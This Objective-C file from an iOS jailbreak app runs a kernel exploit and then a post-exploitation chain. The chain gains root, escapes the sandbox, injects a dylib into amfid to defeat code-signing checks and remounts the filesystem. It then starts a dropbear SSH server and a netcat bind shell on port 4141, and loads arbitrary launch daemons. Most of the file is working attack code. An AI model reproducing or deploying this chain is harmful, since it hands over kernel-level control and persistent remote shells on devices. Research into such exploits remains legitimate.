//
//  ViewController.m
//  multi_path
//
//  Created by Ian Beer on 5/28/18.
//  Copyright © 2018 Ian Beer. All rights reserved.
//


#import "ViewController.h"
#include "sploit.h"
#include "jelbrek.h"
#include "kern_utils.h"
#include "offsetof.h"
#include "patchfinder64.h"
#include "shell.h"
#include "kexecute.h"
#include "unlocknvram.h"
#include "remap_tfp_set_hsp.h"
#include "inject_criticald.h"
//#include "amfid.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>


mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;

//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
    
#define ptrSize sizeof(uintptr_t)
    
    uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    
                    printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                    
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}


@interface ViewController ()

@end

@implementation ViewController

//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
- (NSString *)getIPAddress {
    
    NSString *address = @"Are you connected to internet?";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    // retrieve the current interfaces - returns 0 on success
    success = getifaddrs(&interfaces);
    if (success == 0) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                // Check if interface is en0 which is the wifi connection on the iPhone
                // or usb en2
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"] ||
                    [[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en2"]) {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    
                    [self log:[NSString stringWithFormat:@"Shell should be up and running\nconnect with netcat: nc %@ 4141", address]];
                }
                
            }
            
            temp_addr = temp_addr->ifa_next;
        }
    }
    // Free memory
    freeifaddrs(interfaces);
    return address;
    
}

-(void)log:(NSString*)log {
    self.logs.text = [NSString stringWithFormat:@"%@%@\n", self.logs.text, log];
}

-(void)jelbrek {
    //-------------basics-------------//
    get_root(getpid()); //setuid(0)
    setcsflags(getpid());
    unsandbox(getpid());
    platformize(getpid()); //tf_platform

    if (geteuid() == 0) {
        
        [self log:@"Success! Got root!"];
        
        FILE *f = fopen("/var/mobile/.roottest", "w");
        if (f == 0) {
            [self log:@"Failed to escape sandbox!"];
            return;
        }
        else
            [self log:[NSString stringWithFormat:@"Successfully got out of sandbox! Wrote file! %p", f]];
        fclose(f);
        
    }
    else {
        [self log:@"Failed to get root!"];
        return;
    }

    //-------------amfid-------------//
    
    //uint64_t selfcred = borrowCredsFromDonor("/usr/bin/sysdiagnose"); //eta son! once I get this working I won't rely on QiLin anymore cus it's closed source
    
    uint64_t selfcred = borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
    
    NSString *tester = [NSString stringWithFormat:@"%@/iosbinpack64/test", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([tester UTF8String], 777); //give it proper permissions
    
    if (launch((char*)[tester UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL)) castrateAmfid(); //patch amfid
    
    pid_t amfid = pid_for_name("amfid");
    platformize(amfid);
    //add required entitlements to load unsigned library
    entitlePid(amfid, "get-task-allow", true);
    entitlePid(amfid, "com.apple.private.skip-library-validation", true);
    setcsflags(amfid);
    
    //amfid payload
    sleep(2);
    NSString *pl = [NSString stringWithFormat:@"%@/amfid_payload.dylib", [[NSBundle mainBundle] bundlePath]];
    inject_dylib(amfid, (char*)[pl UTF8String]);
    int rv2 = inject_dylib(amfid, (char*)[pl UTF8String]); //properly patch amfid
    sleep(1);
    
    //binary to test codesign patch
    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([testbin UTF8String], 777); //give it proper permissions
    
    undoCredDonation(selfcred);
    
    //-------------codesign test-------------//
    
    int rv = launch((char*)[testbin UTF8String], NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    [self log:(rv) ? @"Failed to patch codesign!" : @"SUCCESS! Patched codesign!"];
    [self log:(rv2) ? @"Failed to inject code to amfid!" : @"Code injection success!"];
    
    //-------------remount-------------//
    
    if (@available(iOS 11.3, *)) {
        [self log:@"Remount eta son?"];
    } else if (@available(iOS 11.0, *)) {
        remount1126();
        [self log:[NSString stringWithFormat:@"Did we mount / as read+write? %s", [[NSFileManager defaultManager] fileExistsAtPath:@"/RWTEST"] ? "yes" : "no"]];
    }
    
    
    //-------------host_get_special_port 4-------------//
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    remap_tfp0_set_hsp4(&mapped_tfp0);
    [self log:[NSString stringWithFormat:@"enabled host_get_special_port_4_? %@", (mapped_tfp0 == MACH_PORT_NULL) ? @"FAIL" : @"SUCCESS"]];
    
    //-------------nvram-------------//
    
    unlocknvram();
    
    //-------------dropbear-------------//
    
    NSString *iosbinpack = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/iosbinpack64/"];
    
    int dbret = -1;
    
    if (!rv && !rv2) {
        prepare_payload(); //chmod all binaries
        
        sleep(3);
        
        NSString *dropbear = [NSString stringWithFormat:@"%@/iosbinpack64/usr/local/bin/dropbear", [[NSBundle mainBundle] bundlePath]];
        NSString *bash = [NSString stringWithFormat:@"%@/iosbinpack64/bin/bash", [[NSBundle mainBundle] bundlePath]];
        NSString *profile = [NSString stringWithFormat:@"%@/iosbinpack64/etc/profile", [[NSBundle mainBundle] bundlePath]];
        NSString *profiledata = [NSString stringWithContentsOfFile:profile encoding:NSASCIIStringEncoding error:nil];
        [[profiledata stringByReplacingOccurrencesOfString:@"REPLACE_ME" withString:iosbinpack] writeToFile:profile atomically:YES encoding:NSASCIIStringEncoding error:nil];
        
        
        mkdir("/var/dropbear", 0777);
        unlink("/var/profile");
        cp([profile UTF8String], "/var/profile");
        chmod("/var/profile", 0777);
        
        
        //NSString *environment = [NSString stringWithFormat:@"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games:%@/usr/local/sbin:%@/usr/local/bin:%@/usr/sbin:%@/usr/bin:%@/sbin:%@/bin", iosbinpack, iosbinpack, iosbinpack, iosbinpack, iosbinpack, iosbinpack];
        //const char* env[] = {"PS1='\\h:\\w \\u\\$'", (const char*)[environment UTF8String],  NULL}; doesn't work
        
        dbret = launchAsPlatform((char*)[dropbear UTF8String], "-R", "--shell", (char*)[bash UTF8String], "-E", "-p", "22", NULL); //since I can't get environment to work properly you have to run /var/profile manually to setup the environment variables
        
        //-------------launch daeamons-------------//
        //--you can drop any daemon plist in iosbinpack64/LaunchDaemons and it will be loaded automatically. "REPLACE_BIN" will automatically get replaced by the absolute path of iosbinpack64--//
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        NSString *launchdaemons = [NSString stringWithFormat:@"%@/iosbinpack64/LaunchDaemons", [[NSBundle mainBundle] bundlePath]];
        NSString *launchctl = [NSString stringWithFormat:@"%@/iosbinpack64/bin/launchctl", [[NSBundle mainBundle] bundlePath]];
        NSArray *plists = [fileManager contentsOfDirectoryAtPath:launchdaemons error:nil];
        
        NSString *fileData;
        
        for (__strong NSString *file in plists) {
            
            file = [[[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/iosbinpack64/LaunchDaemons/"] stringByAppendingString:file];
            fileData = [NSString stringWithContentsOfFile:file encoding:NSASCIIStringEncoding error:nil];
            
            printf("[*] Patching plist %s\n", [file UTF8String]);
            
            [[fileData stringByReplacingOccurrencesOfString:@"REPLACE_ME" withString:iosbinpack] writeToFile:file atomically:YES encoding:NSASCIIStringEncoding error:nil];
            
            chmod([file UTF8String], 0644);
            chown([file UTF8String], 0, 0);
        }
        
        launchAsPlatform((char*)[launchctl UTF8String], "unload", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        launchAsPlatform((char*)[launchctl UTF8String], "load", (char*)[launchdaemons UTF8String], NULL, NULL, NULL, NULL, NULL);
        
        sleep(1);
        
        [self log:([fileManager fileExistsAtPath:@"/var/log/testbin.log"]) ? @"Successfully loaded daemons!" : @"Failed to load launch daemons!"];
        unlink("/var/log/testbin.log");
    }
    
    if (!dbret) {
        if ([[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
            [self log:@"Connect to Wi-fi in order to use SSH"];
    }
    else {
        [self log:@"Failed to initialize SSH."];
    }
    
    //trust_bin("/bin/launchctl"); //uncomment this if you want an always working (platformized) launchctl. trust_bin does NOT work on 11.3.x but probably does on 11.2.x.
    
    term_kexecute();
    term_kernel();
    
    //-------------netcat shell-------------//
    if (!rv) {
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            drop_payload(); //chmod 777 all binaries and spawn a shell
        });
    
        if ([[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
            [self log:@"Connect to Wi-fi in order to use the shell"];
        else
            [self log:[NSString stringWithFormat:@"Shell should be up and running\nconnect with netcat: \nnc %@ 4141", [self getIPAddress]]];
    }
    
    //-------------to connect use netcat-------------//
    //----------------nc YOUR_IP 4141-------------//
    //------------replace your IP in there------------//
    
}
- (IBAction)go:(id)sender {
    taskforpidzero = run();
    kernel_base = find_kernel_base();
    kslide = kernel_base - 0xfffffff007004000;
    
    if (taskforpidzero != MACH_PORT_NULL) {
        [self log:@"Exploit success!"];
        init_jelbrek(taskforpidzero, kernel_base);
        [self jelbrek];
    }
    else
        [self log:@"Exploit failed!"];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
